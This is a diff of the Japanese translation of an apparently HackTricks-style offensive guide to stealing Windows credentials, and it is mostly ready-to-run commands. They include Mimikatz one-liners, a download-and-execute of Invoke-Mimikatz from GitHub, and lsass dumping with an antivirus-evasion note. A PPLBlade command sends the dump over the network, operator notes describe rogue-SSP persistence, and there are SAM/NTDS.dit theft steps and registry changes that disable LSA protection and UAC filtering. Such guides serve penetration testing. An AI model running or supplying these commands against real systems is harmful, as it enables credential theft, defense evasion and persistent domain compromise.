@@ -1,8 +1,9 @@
-# Windows認証情報の窃取
+# Windows Credentials の窃取
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## 認証情報 Mimikatz
+## Credentials Mimikatz
+
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -16,19 +17,23 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**[このページ](credentials-mimikatz.md)で、Mimikatzで実行できるその他の操作を確認してください。**
+
+**Mimikatzができるその他のことは** [**このページ**](credentials-mimikatz.md)**で確認できます。**
 
 ### Invoke-Mimikatz
+
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**こちらで認証情報の保護方法について確認できます。**](credentials-protections.md) **これらの保護機能により、Mimikatz による一部の認証情報の抽出を防止できる場合があります。**
 
-## Meterpreter の認証情報
+[**考えられる認証情報の保護策についてはこちらをご覧ください。**](credentials-protections.md) **これらの保護策により、Mimikatzが一部の認証情報を抽出できなくなる可能性があります。**
 
-私が作成した [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用して、被害者内部の** **パスワードとハッシュを検索**します。
+## Meterpreterでの認証情報
+
+私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)**を使って**、被害者のシステム内にある**パスワードとハッシュを検索**します。
+
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -45,14 +50,16 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## AV の回避
+
+## AVの回避
 
 ### Procdump + Mimikatz
 
-[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) の **Procdump は正規の Microsoft tool** であるため、Defender では検出されません。\
-この tool を使用して **lsass process を dump** し、**dump をダウンロード**して、dump から **credentials をローカルで抽出**できます。
+**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**のProcdumpは正規のMicrosoftツール**なので、Defenderには検知されません。\
+このツールを使って**lsassプロセスをdump**し、**dumpをダウンロード**して、dumpから**認証情報をローカルで抽出**できます。
 
-[SharpDump](https://github.com/GhostPack/SharpDump) も使用できます。
+[SharpDump](https://github.com/GhostPack/SharpDump)も使用できます。
+
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -69,112 +76,136 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) によって自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**注**: 一部の **AV** は、**procdump.exe を使用して lsass.exe をダンプする**操作を**悪意のあるもの**として**検出**する場合があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を**検出**しているためです。そのため、procdump に渡す**引数**として、lsass.exe の**名前**ではなく lsass.exe の **PID** を渡す方が**ステルス性が高くなります。**
+このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) で自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-### **comsvcs.dll** を使用した lsass のダンプ
+**注**: 一部の**AV**は、**procdump.exe を使用して lsass.exe を dump することを**悪意のある行為として**検知**する場合があります。これは、文字列 **"procdump.exe" と "lsass.exe"** を**検知**しているためです。そのため、**lsass.exe という名前の代わりに**、lsass.exe の **PID** を **引数**として procdump に渡す方が、より**ステルス性が高く**なります。
 
-`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ発生時に**プロセスメモリをダンプする**役割を担います。この DLL には **`MiniDumpW`** という**関数**が含まれており、`rundll32.exe` を使用して呼び出すように設計されています。\
-最初の 2 つの引数は使用しても意味がありませんが、3 番目の引数は 3 つの要素に分かれています。ダンプ対象のプロセス ID が 1 つ目の要素、ダンプファイルの場所が 2 つ目の要素、3 つ目の要素は必ず **full** という単語になります。代替オプションは存在しません。\
-これら 3 つの要素が解析されると、DLL はダンプファイルの作成を開始し、指定されたプロセスのメモリをこのファイルに転送します。\
-**comsvcs.dll** を使用して lsass プロセスをダンプできるため、procdump をアップロードして実行する必要がなくなります。この手法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。<sup>[[9]](#references)</sup>
+### **comsvcs.dll** を使った lsass の Dumping
 
-実行には次のコマンドを使用します:
+`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ発生時に**プロセスメモリを dump する**役割を担います。この DLL には **`MiniDumpW`** という**関数**が含まれており、`rundll32.exe` を使って呼び出すように設計されています。\
+最初の2つの引数は使用されませんが、3つ目の引数は3つの要素に分かれています。dump 対象のプロセス ID が1つ目の要素、dump ファイルの保存先が2つ目の要素、3つ目の要素は **full** という単語に固定されています。ほかのオプションはありません。\
+これら3つの要素が解析されると、DLL は dump ファイルを作成し、指定されたプロセスのメモリをそのファイルに書き込みます。\
+**comsvcs.dll** を使って lsass プロセスを dump できるため、procdump をアップロードして実行する必要はありません。この方法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。<sup>[[9]](#references)</sup>
+
+実行には次のコマンドを使用します。
+
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
+
 **このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**
 
-### **Task Managerを使用したlsassのダンプ**
+### **Task Managerでlsassをダンプする**
 
 1. Task Barを右クリックし、Task Managerをクリックします
 2. More detailsをクリックします
-3. Processesタブで「Local Security Authority Process」プロセスを検索します
-4. 「Local Security Authority Process」プロセスを右クリックし、「Create dump file」をクリックします
+3. Processesタブで「Local Security Authority Process」を探します
+4. 「Local Security Authority Process」を右クリックし、「Create dump file」をクリックします
 
-### procdumpを使用したlsassのダンプ
+### procdumpでlsassをダンプする
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suiteの一部であるMicrosoft署名済みバイナリです。
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートに含まれるMicrosoft署名済みバイナリです。
+
+既存のシステム全体のクラッシュダンプや、アクセス可能なユーザーフォルダー内の圧縮コピーには、オフライン分析用の認証情報が残っている場合があります。`MEMORY.DMP`や`MEMORY.7z`のようなファイル名は、確認対象の手がかりにすぎません。出所とアクセス権を確認し、利用可能または最新の認証情報が含まれていると決めつけないでください。
+
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## PPLBlade による lsass のダンプ
+
+## PPLBlade を使った LSASS のダンプ
 
 [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリダンプを難読化し、ディスクに保存せずにリモートワークステーションへ転送できる Protected Process Dumper Tool です。
 
 **主な機能**:
 
-1. PPL 保護のバイパス
-2. Defender のシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
-3. ディスクに保存せずに RAW および SMB の upload methods を使用してメモリダンプをアップロード（fileless dump）
+1. PPL 保護の回避
+2. Defender のシグネチャベースの検出を回避するためのメモリダンプファイルの難読化
+3. RAW および SMB のアップロード方式を使って、ディスクに保存せずにメモリダンプをアップロードする（ファイルレスダンプ）
+
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
-## LalsDumper – MiniDumpWriteDumpを使用しないSSPベースのLSASSダンプ
 
-Ink Dragonには、`MiniDumpWriteDump`を一度も呼び出さない3段階のdumperである **LalsDumper** が含まれているため、このAPIへのEDRフックは発火しない:<sup>[[3]](#references)</sup>
+## LalsDumper – MiniDumpWriteDump を使わない SSP ベースの LSASS ダンプ
 
-1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`から32個の小文字の`d`で構成されたプレースホルダーを検索し、それを`rtu.txt`への絶対パスで上書きして、パッチ済みDLLを`nfdp.dll`として保存し、`AddSecurityPackageA("nfdp","fdp")`を呼び出す。これにより、**LSASS**は悪意のあるDLLを新しいSecurity Support Provider (SSP)としてロードする。
-2. **LSASS内部のStage 2** – LSASSが`nfdp.dll`をロードすると、DLLは`rtu.txt`を読み込み、各バイトを`0x20`とXORし、デコードされたblobをメモリにマッピングしてから実行を移す。
-3. **Stage 3 dumper** – マッピングされたpayloadは、ハッシュ化されたAPI名（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）から解決した**direct syscalls**を使用してMiniDumpのロジックを再実装する。`Tom`という専用exportは`%TEMP%\<pid>.ddt`を開き、圧縮されたLSASSダンプをファイルにストリーミングし、後でexfiltrationできるようハンドルを閉じる。
+Ink Dragon は **LalsDumper** と呼ばれる3段階の dumper を使用します。この dumper は `MiniDumpWriteDump` を一切呼び出さないため、この API に対する EDR hook は発動しません:<sup>[[3]](#references)</sup>
 
-Operator向けメモ:
+1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` 内から小文字の `d` 32文字で構成される placeholder を検索し、`rtu.txt` の絶対パスで上書きします。パッチ済み DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより、悪意のある DLL が新しい Security Support Provider (SSP) として **LSASS** に読み込まれます。
+2. **LSASS 内の Stage 2** – LSASS が `nfdp.dll` を読み込むと、DLL は `rtu.txt` を読み込み、各バイトを `0x20` と XOR し、デコードした blob をメモリにマップしてから実行を引き渡します。
+3. **Stage 3 dumper** – マップされた payload は、ハッシュ化された API 名から解決した **direct syscalls** を使って MiniDump のロジックを再実装します (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`)。`Tom` という専用 export は `%TEMP%\<pid>.ddt` を開き、圧縮した LSASS dump をファイルに書き込み、ハンドルを閉じます。これにより、後から exfiltration を実行できます。
 
-* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt`を同じディレクトリに置く。Stage 1はハードコードされたプレースホルダーを`rtu.txt`への絶対パスで書き換えるため、これらを分離するとchainが壊れる。
-* 登録は`nfdp`を`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`に追加することで行われる。この値を自分で設定して、LSASSが毎回のboot時にSSPを再ロードするようにできる。
-* `%TEMP%\*.ddt`ファイルは圧縮されたdumpである。ローカルでdecompressしてから、credential extractionのためにMimikatz/Volatilityへ渡す。
-* `AddSecurityPackageA`を成功させるには、`lals.exe`の実行にadmin/SeTcb rightsが必要である。呼び出しが戻ると、LSASSはrogue SSPを透過的にロードしてStage 2を実行する。
-* DLLをdiskから削除しても、LSASSからは追い出されない。registry entryを削除してLSASSをrestart（reboot）するか、長期的なpersistenceのために残しておく。
+オペレーター向けメモ:
+
+* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt` は同じディレクトリに置いてください。Stage 1 はハードコードされた placeholder を `rtu.txt` の絶対パスで書き換えるため、ファイルを分けると chain が機能しません。
+* 登録は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追加して行います。この値を自分で設定すれば、起動のたびに LSASS が SSP を再読み込みするようにできます。
+* `%TEMP%\*.ddt` ファイルは圧縮された dump です。ローカルで解凍してから、Mimikatz/Volatility に渡して credential extraction を行います。
+* `lals.exe` の実行には admin/SeTcb 権限が必要です。これにより `AddSecurityPackageA` が成功します。呼び出しが戻ると、LSASS は rogue SSP を透過的に読み込み、Stage 2 を実行します。
+* ディスクから DLL を削除しても、LSASS からは削除されません。レジストリ エントリを削除して LSASS を再起動する（再起動する）か、長期 persistence のために残しておいてください。
 
 ## CrackMapExec
 
-### SAM hashのダンプ
+### SAM hashをダンプする
+
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
+
 ### Dump LSA secrets
+
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### ターゲット DC から NTDS.dit をダンプする
+
+### 対象DCからNTDS.ditをDumpする
+
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### 対象 DC から NTDS.dit のパスワード履歴をダンプする
+
+### ターゲット DC から NTDS.dit のパスワード履歴をダンプする
+
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する
+
+### NTDS.dit の各アカウントの pwdLastSet 属性を表示する
+
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## SAM と SYSTEM の窃取
 
-これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM._ に**配置されている**はずです。しかし、これらは保護されているため、**通常の方法で単純にコピーすることはできません**。
+## SAM & SYSTEM の窃取
 
-### Registry から
+これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM._ に**配置**されています。ただし、保護されているため、通常の方法でコピーすることはできません。
 
-これらのファイルを盗む最も簡単な方法は、Registry からコピーを取得することです：
+### レジストリから
+
+これらのファイルを窃取する最も簡単な方法は、レジストリからコピーを取得することです。
+
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**ダウンロード**してKaliマシンに保存し、以下を使用して**ハッシュを抽出**します：
+
+それらのファイルをKaliマシンに**ダウンロード**し、**ハッシュを抽出**するには、次を使用します:
+
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Volume Shadow Copy
 
-この service を使用して、保護された files を copy できます。Administrator 権限が必要です。
+### ボリューム シャドウ コピー
 
-#### Using vssadmin
+このサービスを使用して、保護されたファイルをコピーできます。Administrator 権限が必要です。
 
-vssadmin binary は Windows Server versions でのみ利用できます。
+#### vssadmin を使用する
+
+vssadmin バイナリは Windows Server バージョンでのみ使用できます。
+
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -187,7 +218,9 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-ただし、**Powershell** から同じことができます。これは **SAM file のコピー方法** の例です（使用するハードドライブは "C:" で、C:\users\Public に保存されます）が、保護されたファイルのコピー全般に使えます：
+
+ただし、**Powershell**から同じことができます。これは**SAM fileをコピーする方法**の例です（使用するハードドライブは「C:」で、C:\users\Publicに保存します）。保護されたファイルなら何でもコピーできます。
+
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -198,158 +231,184 @@ cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Pu
 cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
 $volume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-書籍のコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>
+
+Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>
 
 ### Invoke-NinjaCopy
 
-最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使用して、SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
+最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使って、SAM、SYSTEM、ntds.ditのコピーを作成することもできます。
+
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
+
 ## **Active Directory Credentials - NTDS.dit**
 
-**NTDS.dit** ファイルは **Active Directory** の心臓部として知られており、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースであり、**_%SystemRoom%/NTDS/ntds.dit_** に存在します。
+**NTDS.dit** ファイルは **Active Directory** の中核として知られており、ユーザー オブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメイン ユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースで、**_%SystemRoom%/NTDS/ntds.dit_** にあります。
 
-このデータベースでは、主に次の3つのテーブルが管理されています。
+このデータベースには、主に次の3つのテーブルがあります。
 
 - **Data Table**: ユーザーやグループなどのオブジェクトに関する詳細情報を保存します。
-- **Link Table**: グループメンバーシップなどの関係を追跡します。
+- **Link Table**: グループのメンバーシップなど、オブジェクト間の関係を追跡します。
 - **SD Table**: 各オブジェクトの **Security descriptors** を保持し、保存されたオブジェクトのセキュリティとアクセス制御を確保します。
 
-Christoffer Andersson による database-layer の研究資料では、これらのテーブルとバージョンごとの動作について、さらに詳しく説明されています。<sup>[[8]](#references)</sup>
+Christoffer Andersson によるデータベース層の研究では、これらのテーブルとバージョンごとの動作について、さらに詳しく解説されています。<sup>[[8]](#references)</sup>
 
-Windows はそのファイルとのやり取りに _Ntdsa.dll_ を使用し、_lsass.exe_ によって使用されます。そのため、**NTDS.dit** ファイルの **part** が **`lsass`** のメモリ内に存在する場合があります（**cache** を使用することによるパフォーマンス向上のため、最新のアクセスデータを取得できる可能性があります）。
+Windows は _Ntdsa.dll_ を使ってこのファイルとやり取りし、このファイルは _lsass.exe_ によって使用されます。そのため、**NTDS.dit** ファイルの**一部**は **`lsass`** メモリ内に存在する可能性があります（**cache** を使用したパフォーマンス向上のため、最近アクセスされたデータが含まれている可能性があります）。
 
 #### NTDS.dit 内のハッシュを復号する
 
-ハッシュは3回暗号化されています。
+ハッシュは3段階で復号されます。
 
-1. **BOOTKEY** と **RC4** を使用して Password Encryption Key (**PEK**) を復号する。
-2. **PEK** と **RC4** を使用して **hash** を復号する。
-3. **DES** を使用して **hash** を復号する。
+1. **BOOTKEY** と **RC4** を使って Password Encryption Key (**PEK**) を復号する。
+2. **PEK** と **RC4** を使って **hash** を復号する。
+3. **DES** を使って **hash** を復号する。
 
-**PEK** はすべてのドメインコントローラーで**同じ値**ですが、そのドメインコントローラー固有の **SYSTEM** hive にある **BOOTKEY** を使用して **NTDS.dit** 内で暗号化されています。したがって、credentials を抽出するには **NTDS.dit** と **SYSTEM**（`C:\Windows\System32\config\SYSTEM`）の両方が必要です。
+**PEK** はすべてのドメイン コントローラーで**同じ値**ですが、各ドメイン コントローラーの **SYSTEM** hive に含まれる、その DC 固有の **BOOTKEY** を使って **NTDS.dit** 内で**暗号化**されています。したがって、credentials を抽出するには **NTDS.dit** と **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) の両方が必要です。
 
-### Ntdsutil を使用して NTDS.dit をコピーする
+### Ntdsutil を使って NTDS.dit をコピーする
 
 Windows Server 2008 以降で利用できます。
+
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-[**volume shadow copy**](#stealing-sam-and-system) の手法を使って **ntds.dit** ファイルをコピーすることもできます。**SYSTEM file** のコピーも必要になることを忘れないでください（再度、[**registry から dump するか、volume shadow copy**](#stealing-sam-and-system) の手法を使用してください）。
 
-### **NTDS.dit から hash を抽出する**
+[**volume shadow copy**](#stealing-sam-and-system) の手法を使って、**ntds.dit** ファイルをコピーすることもできます。また、**SYSTEM file** のコピーも必要です（同様に、[**レジストリからダンプするか、volume shadow copy の手法を使ってください**](#stealing-sam-and-system)）。
 
-**NTDS.dit** と **SYSTEM** ファイルを**取得した**ら、_secretsdump.py_ などのツールを使用して **hash を抽出**できます：
+### **NTDS.dit からハッシュを抽出する**
+
+**NTDS.dit** ファイルと **SYSTEM** ファイルを**入手したら**、_secretsdump.py_ などのツールを使って**ハッシュを抽出**できます。
+
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-有効な domain admin user を使用して、**自動的に抽出**することもできます:
+
+有効なドメイン管理者ユーザーを使って、自動的に**抽出する**こともできます。
+
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-**大きな NTDS.dit ファイル**の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使用して抽出することを推奨します。
 
-最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` も使用できます。
+**大きな NTDS.dit ファイル**は、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使って抽出することをおすすめします。
 
-### **NTDS.dit から SQLite データベースへのドメインオブジェクトの抽出**
+最後に、**metasploit module** `post/windows/gather/credentials/domain_hashdump` または **mimikatz** `lsadump::lsa /inject` も使用できます。
 
-[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使用すると、NTDS オブジェクトを SQLite データベースに抽出できます。secret だけでなく、raw NTDS.dit ファイルがすでに取得されている場合に、さらなる情報抽出に使用できるオブジェクト全体とその属性も抽出されます。
+### **NTDS.dit からドメインオブジェクトを抽出して SQLite データベースに保存する**
+
+[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)を使うと、NTDS オブジェクトを SQLite データベースに抽出できます。秘密情報だけでなく、オブジェクト全体とその属性も抽出されるため、NTDS.dit ファイルをすでに取得している場合は、さらに情報を抽出できます。
+
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive は必須ではありませんが、secrets の復号（NT および LM hash、cleartext password などの supplemental credentials、Kerberos または trust key、NT および LM password history）を可能にします。その他の情報とともに、以下のデータが抽出されます: hash を含む user および machine account、UAC flag、最終ログオンおよびパスワード変更の timestamp、account の description、name、UPN、SPN、group と再帰的な membership、organizational unit の tree と membership、trust type、direction、attribute を含む trusted domain...
+
+`SYSTEM` hive は必須ではありませんが、秘密情報の復号に使用できます（NT および LM hashes、cleartext passwords などの supplemental credentials、Kerberos または trust keys、NT および LM password histories）。その他の情報とともに、次のデータが抽出されます：ユーザーおよびマシンアカウントとその hashes、UAC flags、最終ログオンおよびパスワード変更の timestamp、アカウントの説明、名前、UPN、SPN、groups と再帰的な memberships、organizational units のツリーと memberships、trust の種類、方向、属性を含む trusted domains...
 
 ## Lazagne
 
-[こちら](https://github.com/AlessandroZ/LaZagne/releases)から binary を download します。この binary を使用すると、複数の software から credential を抽出できます。
+[こちら](https://github.com/AlessandroZ/LaZagne/releases)から binary をダウンロードしてください。この binary を使用すると、複数のソフトウェアから credentials を抽出できます。
+
 ```
 lazagne.exe all
 ```
-## SAM と LSASS から credentials を抽出するその他の tools
+
+## SAM と LSASS から認証情報を抽出するその他のツール
 
 ### Windows credentials Editor (WCE)
 
-この tool は memory から credentials を抽出するために使用できます。以下から download してください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+このツールを使うと、メモリから認証情報を抽出できます。以下からダウンロードしてください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-SAM file から credentials を抽出する
+SAM ファイルから認証情報を抽出します.
+
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
+
 ### PwDump
 
-SAMファイルからcredentialを抽出する
+SAMファイルから認証情報を抽出する
+
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
 type outpwdump
 ```
+
 ### PwDump7
 
-ここからダウンロードできます：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)。そのまま**実行するだけで**パスワードが抽出されます。
+[http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) からダウンロードして、**実行するだけ**でパスワードが抽出されます。
 
-## アイドル状態の RDP セッションの収集とセキュリティ制御の弱体化
+## アイドル状態の RDP セッションの調査とセキュリティ制御の弱体化
 
-Ink Dragon の FinalDraft RAT には、あらゆる red-teamer に役立つ手法を備えた `DumpRDPHistory` tasker が含まれています。<sup>[[3]](#references)</sup>
+Ink Dragon の FinalDraft RAT には `DumpRDPHistory` tasker が含まれており、その手法はあらゆる red-teamer に役立ちます:<sup>[[3]](#references)</sup>
 
-### DumpRDPHistory スタイルの telemetry 収集
+### DumpRDPHistory 形式のテレメトリ収集
 
-* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` にある各ユーザーハイブを解析します。各サブキーには、サーバー名、`UsernameHint`、および最終書き込みタイムスタンプが保存されています。PowerShell を使って FinalDraft のロジックを再現できます。
+* **アウトバウンド RDP ターゲット** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` にあるすべてのユーザーハイブを解析します。各サブキーにはサーバー名、`UsernameHint`、最終書き込みタイムスタンプが保存されています。PowerShell を使って FinalDraft のロジックを再現できます。
 
-```powershell
-Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
-Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
-ForEach-Object {
-$server = Split-Path $_.Name -Leaf
-$user = (Get-ItemProperty $_.Name).UsernameHint
-"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
-}
-}
-```
+  ```powershell
+  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
+      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
+        ForEach-Object {
+            $server = Split-Path $_.Name -Leaf
+            $user = (Get-ItemProperty $_.Name).UsernameHint
+            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
+        }
+  }
+  ```
 
-* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログから Event ID **21**（ログオン成功）と **25**（切断）を照会し、誰がそのコンピューターを管理していたかを特定します。
+* **Inbound RDP の証拠** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログを検索し、イベント ID **21**（ログオン成功）および **25**（切断）から、誰がそのマシンを管理していたかを特定します。
 
-```powershell
-Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
-| Where-Object { $_.Id -in 21,25 } \
-| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
-```
+  ```powershell
+  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
+    | Where-Object { $_.Id -in 21,25 } \
+    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
+  ```
 
-どの Domain Admin が定期的に接続しているかを把握したら、その **切断された** セッションがまだ存在している間に、LSASS を（LalsDumper/Mimikatz で）dump します。CredSSP + NTLM fallback により、検証情報とトークンが LSASS に残るため、それらを SMB/WinRM 経由で replay し、`NTDS.dit` を取得したり、domain controller 上で persistence を確立したりできます。
+どの Domain Admin が定期的に接続しているか把握したら、その**切断済み**セッションがまだ存在する間に、LalsDumper/Mimikatz で LSASS をダンプします。CredSSP + NTLM fallback により、そのユーザーの verifier と tokens が LSASS に残るため、それらを SMB/WinRM 経由で再利用して `NTDS.dit` を取得したり、domain controller に persistence を仕掛けたりできます。
 
-### FinalDraft が標的とする Registry downgrades
+### FinalDraft が標的とする Registry downgrade
 
-同じ implant は、credential theft を容易にするため、複数の registry key も改変します。<sup>[[3]](#references)</sup>
+同じ implant は、credential theft を容易にするため、複数の registry key にも改ざんを加えます:<sup>[[3]](#references)</sup>
+
 ```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
 ```
-* `DisableRestrictedAdmin=1` を設定すると、RDP 中に完全な credential/ticket 再利用が強制され、pass-the-hash 型の pivot が可能になる。
-* `LocalAccountTokenFilterPolicy=1` は UAC token filtering を無効化するため、local admin がネットワーク経由で unrestricted token を取得する。
